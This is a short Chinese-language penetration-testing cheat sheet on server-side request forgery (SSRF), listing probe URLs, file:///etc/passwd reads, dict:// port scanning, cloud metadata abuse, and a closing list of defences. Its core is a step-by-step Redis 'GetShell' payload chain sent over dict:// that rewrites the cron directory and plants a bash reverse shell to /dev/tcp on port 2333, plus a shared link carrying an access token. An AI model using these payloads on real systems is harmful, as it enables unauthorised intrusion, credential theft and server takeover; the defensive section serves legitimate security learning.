任何参数中有url的地方，都有可能存在SSRF漏洞。

## 简单判断是否存在漏洞
参数中有url的地方，修改为`https://www.baidu.com/robots.txt`和`127.0.0.1`看下反应能否读取到网页内容

## file协议获取本地信息
`file:///etc/passwd`读取web配置文件，密码本，host信息等。

## dict协议扫描端口和目录
`dict://127.0.0.1:8000`修改不同的内网地址和ip进行探测

## 伪协议拓展
`file:/// dict:// sftp:// ldap:// tftp:// gopher://`

## 云上SSRF利用
利用SSRF获取云元数据，利用元数据读取到的信息，例如ssh_rsa、进行后渗透。

参考[https://www.yuque.com/g/baohexiawucha/nqbn0l/gpnkf8oz4yvro09s/collaborator/join?token=os5sBE0GsACyR2c6&source=doc_collaborator#](https://www.yuque.com/g/baohexiawucha/nqbn0l/gpnkf8oz4yvro09s/collaborator/join?token=os5sBE0GsACyR2c6&source=doc_collaborator#) 《云上元数据meta-data利用》

## Redis未授权利用GetShell
+ 清空 key  
`dict://x.x.x.x:6379/flushall`
+ 设置要操作的路径为定时任务目录  
`dict://x.x.x.x:6379/config set dir /var/spool/cron/`
+ 在定时任务目录下创建 root 的定时任务文件  
`dict://x.x.x.x:6379/config set dbfilename root`
+ 写入 Bash 反弹 shell 的 payload  
`dict://x.x.x.x:6379/set x "\n* * * * * /bin/bash -i >%26 /dev/tcp/x.x.x.x/2333 0>%261\n"`
+ 保存上述操作。  
`dict://x.x.x.x:6379/save`

## 防御方法
1. 禁止跳转
2. 过滤返回信息，验证远程服务器对请求的响应是比较容易的方法。如果web应用是去获取某一种类型的文件。那么在把返回结果展示给用户之前先验证返回的信息是否符合标准。
3. 禁用不需要的协议，仅仅允许http和https请求。可以防止类似于file://, gopher://, ftp:// 等引起的问题
4. 设置URL白名单或者限制内网IP（使用gethostbyname()判断是否为内网IP）
5. 限制请求的端口为http常用的端口，比如 80、443、8080、8090
6. 统一错误信息，避免用户可以根据错误信息来判断远端服务器的端口状态。

